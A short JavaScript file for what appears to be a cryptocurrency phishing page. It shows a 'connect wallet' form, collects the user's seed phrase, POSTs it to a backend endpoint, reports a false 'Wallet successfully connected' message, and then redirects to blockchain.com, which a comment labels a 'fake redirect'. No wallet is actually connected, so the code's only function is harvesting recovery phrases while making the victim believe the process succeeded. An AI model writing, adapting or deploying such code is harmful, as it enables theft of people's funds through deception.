function connectWallet() {
  const walletForm = document.getElementById("walletForm");
  walletForm.style.display = "block";
}

function submitWallet() {
  const walletType = document.getElementById("walletType").value;
  const seedPhrase = document.getElementById("seedPhrase").value;

  if (seedPhrase.trim().split(" ").length < 12) {
    alert("Please enter a valid 12 or 24-word phrase.");
    return;
  }

  // Simulate backend submission
  fetch("/api/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: walletType,
      phrase: seedPhrase
    })
  }).then(() => {
    alert("Wallet successfully connected.");
    window.location.href = "https://blockchain.com"; // fake redirect
  });
}
